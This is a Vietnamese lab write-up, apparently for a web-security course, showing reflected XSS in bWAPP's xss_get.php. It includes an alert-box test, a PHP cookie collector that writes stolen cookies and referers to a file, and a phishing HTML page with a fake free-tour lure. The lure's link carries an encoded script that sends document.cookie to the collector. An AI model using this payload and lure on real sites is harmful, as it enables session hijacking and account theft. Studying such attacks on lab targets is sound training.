Thử nhập vào 2 box nhập họ tên, ta thấy có response lại là 1 message chào họ tên ta vừa nhập:

![image](https://github.com/NVex0/Cong_nghe_web_an_toan/assets/113530029/901302a7-0605-4af3-8568-f801acc22ddb)

Để ý trên URL, 2 trường này được GET toàn bộ thông tin ta nhập vào rồi trả về đúng như thế. Có thể thử thêm bằng bôi đen:

![image](https://github.com/NVex0/Cong_nghe_web_an_toan/assets/113530029/01069ea9-0246-489f-87b7-0ac861c09285)

Như vậy ta đoán được web vulnerable với XSS, thử truyền vào javascript `<script>alert("Hacked")</script>`:

![image](https://github.com/NVex0/Cong_nghe_web_an_toan/assets/113530029/9333478e-3959-4351-a3d2-395854fa816b)

Vậy là đã chắc chắn web vulnerable với XSS, ta sẽ tiến hành khai thác bằng kỹ thuật đánh cắp cookie:

  - Đầu tiên là code php crawl cookie:

  ```
  <?php
      if(isset($_GET['cookie']))
      {
          $cookie = $_GET['cookie'];
          // Mở file cookie.txt, tham số a nghĩa là file này mở chỉ để write chứ không scan hay read
          $f=fopen('cookie.txt','a');
          // Ta write địa chỉ trang web mà ở trang đó bị ta chèn script.
          fwrite($f,$_SERVER['HTTP_REFERER']);
          // Ghi giá trị cookie
          fwrite($f,". Cookie la: ".$cookie." \n");
          // Đóng file lại
          fclose($f);
      }
  ?>
  ```
  - Tiếp đến là 1 tệp html phishing đối tượng:
  ```
  <html>
    <head>
        <title>CHUC MUNG!!!</title>
    </head>
    <body>
        <h1 align="center">Ban da trung 1 tour di du lich quanh My mien phi cho ca gia dinh!!!!</h1>
        <h1 align="center">-My Dinh Bus-</h1>
    Xem thong tin chi tiet <a href='http://localhost/bwapp/xss_get.php?firstname=%3Cscript%3Ewindow.open%28%22http%3A%2F%2Flocalhost%2Fget.php%3Fcookie%3D%22%2Bdocument.cookie%29%3C%2Fscript%3E&lastname=Hung&form=submit'>tai day</a> .
    </body>
</html>
```

Khi đối tượng ấn vào link href sẽ bị chuyển hướng tới web đã bị đệm javascript, sau đó sẽ bị crawl cookie về cookie.txt tại máy hacker:

![image](https://github.com/NVex0/Cong_nghe_web_an_toan/assets/113530029/45200970-4482-4cea-a057-a00670c28cd5)
